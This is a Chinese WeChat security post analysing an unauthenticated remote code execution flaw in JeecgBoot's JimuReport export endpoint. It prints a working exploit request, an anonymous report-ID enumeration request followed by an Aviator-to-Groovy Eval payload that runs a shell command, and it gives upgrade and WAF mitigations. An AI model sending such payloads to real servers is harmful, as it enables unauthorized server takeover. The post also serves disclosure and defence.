---
title: 【2026hvv】JeecgBoot 【0day】，文档细琐~【附验证exp】，速修~！
url: https://mp.weixin.qq.com/s/LCFrnxpW2_5c2l6ucedcvg
source: Doonsec's feed
date: 2026-09-01
fetch_date: 2026-09-02T06:36:20.820653
---

# 【2026hvv】JeecgBoot 【0day】，文档细琐~【附验证exp】，速修~！

# 【2026hvv】JeecgBoot 【0day】，文档细琐~【附验证exp】，速修~！

FL\_Clover
FL\_Clover

网络安全007

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

hvv已经去了三轮了，预计今天结束了，不过即将开始第四轮，兄弟们的零食炫的如何了？今年的【0day】漏洞普遍减少，流出的越来越少了......![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/assets/newemoji/Cold.png)

一、漏洞概述

    该漏洞是一个高危的远程代码执行（RCE）漏洞，影响 JeecgBoot 低代码开发平台及其集成的积木报表（JimuReport）组件。攻击者无需任何身份认证，即可通过构造恶意请求，在目标服务器上执行任意命令，从而完全控制服务器。

    漏洞的核心在于积木报表的 /jmreport/auto/export 导出接口。该接口存在双重安全问题：

* 未授权访问：由于 JeecgBoot 的 Shiro 安全框架配置不当，将 /jmreport/\*\* 路径设置为匿名可访问，导致攻击者无需登录即可调用此接口。
* 代码注入：接口在处理报表导出参数时，对以 = 开头的参数值未进行有效过滤。攻击者可利用此特性，通过底层的 Groovy 脚本引擎执行恶意代码。

![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0zoxfSlDJicM25icy2CBaSOT2DuK4KhdsvJFRZ4gmSuic6OvxFwyIwhHAomfEC93HxBPJ2iahRiaOmCnRpLMujqHbibdVEpvz3jiblzD4/640?wx_fmt=png&from=appmsg)

二、漏洞影响范围

| 部署方式 | 受影响版本 | 说明 |
| --- | --- | --- |
| 独立部署积木报表（JimuReport） | ≤ 2.5.0 | 组件自身存在缺陷，直接受影响 |
| 集成于 JeecgBoot 平台 | JeecgBoot ≤ 3.9.3 | 平台内置 JimuReport ≤ 2.5.0，随平台受影响 |

注意，特别说明一下：

* JeecgBoot 最新 Release v3.9.3（2026年8月20日发布）默认捆绑的仍为 JimuReport 2.5.0，不会自动获得修复。
* 修复版本为 JimuReport v2.5.1（2026年8月25日发布），需手动升级依赖。

三、漏洞技术分析

3.1 攻击入口：未授权访问链

该漏洞的利用前提是接口完全无需认证，这由两层配置共同导致：

1. 接口级注解放行： /jmreport/auto/export 接口标注了 @JimuNoLoginRequired 注解，使得积木报表内部的 JimuReportTokenInterceptor 拦截器直接跳过身份校验。
2. 框架级匿名配置： JeecgBoot 的 Shiro 安全配置（ShiroConfig）将整个 /jmreport/\*\* 路径配置为 anon（匿名放行），从框架层面彻底取消了鉴权要求。

两层放行叠加，使得任何外部请求均可直接触达导出逻辑。

3.2 漏洞根因：表达式注入导致代码执行

漏洞的核心触发链路如下：

```
用户输入参数 → getBaseSql() → queryJson.putAll(paramJson) → ExpressUtil.a() → Aviator引擎编译执行 → Groovy脚本调用 → 系统命令执行
```

详细分析：

* 当导出类型为 PDF 时，请求体中的 reportParams[].params 字段会被传入 getBaseSql 方法。
* 该方法通过 queryJson.putAll(paramJson) 将所有用户参数合并，随后对每个参数值调用 ExpressUtil.a 进行处理。
* ExpressUtil.a 的逻辑是：当参数值以等号 = 开头时，会移除所有等号前缀，然后将剩余内容交给 Aviator 表达式引擎进行编译和执行。
* Aviator 引擎虽然通过 disableFeature(NewInstance) 禁用了实例化操作，但 use 语句和静态方法调用并未被禁用。
* JeecgBoot 运行时的 classpath 中包含 Groovy 库，攻击者可利用 use groovy.util.Eval 引入 Groovy 的 Eval.me() 方法，该方法支持执行任意 Groovy 代码，包括调用 Runtime.exec() 或 Groovy 的 String.execute() 方法来执行操作系统命令。

3.3 与已知漏洞的区别

| 编号 | 接口 | 差异点 |
| --- | --- | --- |
| CVE-2026-58375 | 同一接口 | 仅涉及未授权导出报表数据，不涉及代码执行 |
| CVE-2026-36418 | `/jmreport/executeSelectApi` | 该接口无匿名注解放行，需要有效Token |
| 本漏洞（QVD-2026-56805） | `/jmreport/auto/export` | 匿名入口 + Aviator表达式注入 + Groovy命令执行 |

四、漏洞利用【验证EXP】

4.1 前置步骤：枚举报表ID

由于利用需要指定一个有效的报表 id，攻击者可先通过以下接口匿名枚举：

```
GET /jeecg-boot/jmreport/excelQueryByTemplate?name=&pageNo=1&pageSize=10 HTTP/1.1Host: <目标地址>Accept: application/json
```

该接口同样无需认证，返回结果中包含可用报表的 id 字段。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IGws6hSXN0yMHINhrqw35oQmuVumuggialStMhpM48fl9WWdH3qfBkfR5LPT8aUsRlibzsCjon73o4d2bx4loZ2H8FcQjOpjVKswftrQnmLkA/640?wx_fmt=png&from=appmsg)

4.2 命令执行利用

获取有效报表 id 后，向导出接口发送以下请求：

```
POST /jeecg-boot/jmreport/auto/export HTTP/1.1Host: <目标地址>Content-Type: application/jsonAccept: application/json{  "reportParams": [    {      "id": "<枚举到的报表ID>",      "params": {        "x": "=use groovy.util.Eval; Eval.me('[\"/bin/bash\",\"-c\",\"id\"].execute()')"      },      "exportType": "pdf"    }  ]}
```

![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0xFTib7joZvs6gghN7D4qGhpf3nuwibWyIRevMI3fEibEN7ksl80pFu1RwLPTzStoSpOh88azHTWYxBJRs701Eiav63a5f3icoPxbJg/640?wx_fmt=png&from=appmsg)

利用原理说明：

* 参数值以 = 开头触发 Aviator 表达式解析路径；
* use groovy.util.Eval 将 Groovy 的 Eval 类引入当前作用域；
* Eval.me(...) 执行传入的 Groovy 代码；
* [\"/bin/bash\",\"-c\",\"id\"].execute() 是 Groovy 语法，等价于调用 Runtime.exec()，实现系统命令执行。

五、修复建议

5.1 根本修复（强烈推荐）

* 升级积木报表组件至 v2.5.1 或更高版本。
* 独立部署场景：直接替换 JimuReport 依赖包至 2.5.1+
* JeecgBoot 集成场景：手动修改 pom.xml 中 JimuReport 依赖版本

Maven 依赖配置示例：

```
<!-- Spring Boot 3.x 项目 --><dependency>    <groupId>org.jeecgframework.jimureport</groupId>    <artifactId>jimureport-spring-boot3-starter</artifactId>    <version>2.5.1</version></dependency><!-- Spring Boot 4.x 项目 --><dependency>    <groupId>org.jeecgframework.jimureport</groupId>    <artifactId>jimureport-spring-boot4-starter</artifactId>    <version>2.5.1</version></dependency>
```

⚠️ **注意：** JeecgBoot v3.9.3 默认捆绑的仍是 JimuReport 2.5.0，必须手动升级，不能仅依赖平台版本更新。

5.2 临时缓解措施

在无法立即升级的情况下，可采取以下临时防护措施：

| 措施 | 具体操作 |
| --- | --- |
| 收敛匿名访问 | 修改 Shiro 配置，移除 `/jmreport/` 的 `anon` 规则，为导出接口强制添加认证校验；同时移除接口上的 `@JimuNoLoginRequired` 注解 |
| WAF/IPS 拦截 | 在 Web 应用防火墙添加规则，针对 `/jmreport/auto/export` 接口，拦截参数值以 `=` 开头且包含 `groovy.util.Eval`、`.execute()`、`.class.forName` 等关键字的请求 |
| 网络层收敛 | 限制 `/jmreport/` 路径的外部访问，仅允许可信内网或管理网段访问 |
| 禁用表达式解析 | 临时关闭导出接口的表达式引擎处理逻辑（可能影响正常报表功能，需评估业务影响） |

5.3 安全加固建议

* 对积木报表所有对外接口进行全面的认证鉴权审计，排查是否存在其他未授权访问点；
* 建立依赖组件的版本跟踪机制，及时关注安全公告；
* 在代码审计中重点关注表达式引擎（Aviator、SpEL、OGNL等）对用户输入的解析行为；
* 生产环境遵循最小权限原则，限制应用进程的系统命令执行权限。

参考链接：

```
https://github.com/jeecgboot/JeecgBoot/issues/9837https://github.com/jeecgboot/jimureport/commit/414017dbe00764f908066b4eb9745f4c6ea99e7f
```

**免责声明：**

 本文章仅做网络安全技术研究使用！另利用网络安全007公众号所提供的所有信息进行违法犯罪或造成任何后果及损失，均由**使用者自身承担负责**，与网络安全007公众号**无任何关系**，也不为其负任何责任，**请各位自重！**公众号发表的一切文章如有侵权烦请私信联系告知，我们会立即删除并对您表达最诚挚的歉意！感谢您的理解！**让我们一起为中国网络安全事业尽一份自己的绵薄之力！**

---推荐阅读---

[攻防演习系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4480577090483748870#wechat_redirect)

[渗透技术文章系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483666897053253633#wechat_redirect)

[未授权漏洞系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483456618323345413#wechat_redirect)

[HW专项系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483461171911426059#wechat_redirect)

[应急响应系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=2735815599062548484#wechat_redirect)

[工具推荐系列](https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI1NTE2NzQ3NQ==&action=getalbum&album_id=4483471065368592394#wechat_redirect)

写作不易，分享快乐

期待你的 **分享**●**点赞●在看**●关注**●收藏******

![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0yC4UvVZTh0GWblmLs0dtN1Sfnf88e3vkpokovgdsQAfPI16CnM3C7S6uNVNGHtnsiaFU1via2Bibo92ria29FVIMstgj6wQDg9XbI/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0yhaJkO4MOgVsUQPeanvrkvkicst8BvPqz4WUDrjRDYugcOD44S3qjpgr5MvZzZBiaEggxoicGmeNfiaZGxW2x20MHp2WxNZpKFbVQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过